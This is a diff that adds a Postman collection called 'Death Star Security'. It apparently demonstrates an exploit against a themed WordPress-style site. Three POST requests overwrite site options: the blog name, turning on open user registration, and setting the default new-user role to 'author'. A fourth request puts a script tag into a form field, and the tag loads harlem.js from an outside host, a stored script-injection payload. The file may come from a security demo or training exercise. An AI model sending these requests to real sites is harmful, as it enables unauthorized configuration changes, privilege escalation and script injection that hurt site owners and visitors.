@@ -1,0 +1,160 @@
+{
+	"info": {
+		"_postman_id": "e55f8af2-0d4b-430e-af72-c05c9ca533e3",
+		"name": "Death Star Security",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Blogname Storm Trooper Security",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "target-email",
+							"value": "blogname",
+							"type": "text"
+						},
+						{
+							"key": "target-commander",
+							"value": "Remember Alderaan",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://www.deathstarsecurity.com/storm-trooper-customer-targeting/",
+					"protocol": "https",
+					"host": [
+						"www",
+						"deathstarsecurity",
+						"com"
+					],
+					"path": [
+						"storm-trooper-customer-targeting",
+						""
+					]
+				},
+				"description": "Exploit for Death Star Security Storm Trooper"
+			},
+			"response": []
+		},
+		{
+			"name": "Users Can Register Storm Trooper Security",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "target-email",
+							"value": "users_can_register",
+							"type": "text"
+						},
+						{
+							"key": "target-commander",
+							"value": "1",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://www.deathstarsecurity.com/storm-trooper-customer-targeting/",
+					"protocol": "https",
+					"host": [
+						"www",
+						"deathstarsecurity",
+						"com"
+					],
+					"path": [
+						"storm-trooper-customer-targeting",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Default Role Storm Trooper",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "target-email",
+							"value": "default_role",
+							"type": "text"
+						},
+						{
+							"key": "target-commander",
+							"value": "author",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://www.deathstarsecurity.com/storm-trooper-customer-targeting/",
+					"protocol": "https",
+					"host": [
+						"www",
+						"deathstarsecurity",
+						"com"
+					],
+					"path": [
+						"storm-trooper-customer-targeting",
+						""
+					]
+				},
+				"description": "\t"
+			},
+			"response": []
+		},
+		{
+			"name": "Shake Droid Scanner",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "target-name",
+							"value": "<script src=https://rebel.deathstarsecurity.com/wp-content/uploads/harlem.js></script>",
+							"type": "text"
+						},
+						{
+							"key": "target-email",
+							"value": "urhaxed@lockr.io",
+							"type": "text"
+						},
+						{
+							"key": "target-inspire",
+							"value": "snoke",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://www.deathstarsecurity.com/droid-scanner",
+					"protocol": "https",
+					"host": [
+						"www",
+						"deathstarsecurity",
+						"com"
+					],
+					"path": [
+						"droid-scanner"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
